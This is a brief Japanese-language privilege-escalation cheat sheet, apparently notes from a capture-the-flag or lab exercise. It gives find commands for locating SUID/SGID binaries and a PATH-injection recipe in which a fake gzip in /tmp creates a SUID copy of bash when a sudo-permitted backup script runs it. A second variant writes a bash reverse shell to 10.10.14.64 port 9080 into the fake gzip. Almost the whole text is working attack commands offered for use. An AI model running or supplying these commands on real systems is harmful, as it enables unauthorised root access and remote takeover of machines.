## SUID ファイル調査
```
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
find / -perm -u=s -type f 2>/dev/null
```

## PATH インジェクション
1. tmp/下のコマンドが最優先で実行されるよう環境変数を追加
2. 都合良いgzipコマンドを作成（/tmpにSUID権限を付与）  
3. gzipに実行権限を付与  
4. 管理者権限でsudo -lで許可されているコマンドを実行  
```
cd /tmp
export PATH=/tmp:$PATH
echo -ne '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > gzip
chmod +x gzip
sudo /opt/scripts/access_backup.sh
```

リバースシェルを得るパターン  
```
cd /tmp  
echo "bash -i >& /dev/tcp/10.10.14.64/9080 0>&1" > gzip  
chmod +x gzip  
export PATH=/tmp:$PATH
```
